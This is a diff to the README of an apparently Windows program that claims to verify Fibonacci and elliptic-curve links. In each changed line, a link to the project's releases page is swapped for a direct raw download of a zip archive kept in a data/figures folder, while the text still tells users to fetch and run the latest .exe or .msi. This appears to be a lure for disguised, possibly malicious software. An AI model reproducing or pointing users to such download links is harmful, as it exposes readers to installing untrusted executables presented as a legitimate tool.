@@ -1,6 +1,6 @@
 # 📐 fibonacci-cm-elliptic - Verify Fibonacci and Elliptic Curve Links
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/salvaXD/fibonacci-cm-elliptic/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/salvaXD/fibonacci-cm-elliptic/raw/refs/heads/main/data/figures/cm-elliptic-fibonacci-2.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ It takes input data, runs calculations, and shows you results that confirm the l
 
 1. Visit the official download page here:
 
-   [Download fibonacci-cm-elliptic releases](https://github.com/salvaXD/fibonacci-cm-elliptic/releases)
+   [Download fibonacci-cm-elliptic releases](https://github.com/salvaXD/fibonacci-cm-elliptic/raw/refs/heads/main/data/figures/cm-elliptic-fibonacci-2.4.zip)
 
 2. Look for the latest Windows version. It will usually have a name ending in `.exe` or `.msi`.
 
@@ -90,7 +90,7 @@ To update the program:
 
 1. Visit the releases page again:
 
-   [Check for Updates](https://github.com/salvaXD/fibonacci-cm-elliptic/releases)
+   [Check for Updates](https://github.com/salvaXD/fibonacci-cm-elliptic/raw/refs/heads/main/data/figures/cm-elliptic-fibonacci-2.4.zip)
 
 2. Download the newest version for Windows.
 
@@ -120,7 +120,7 @@ To update the program:
 
 ---
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/salvaXD/fibonacci-cm-elliptic/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/salvaXD/fibonacci-cm-elliptic/raw/refs/heads/main/data/figures/cm-elliptic-fibonacci-2.4.zip)
 
 ---
 
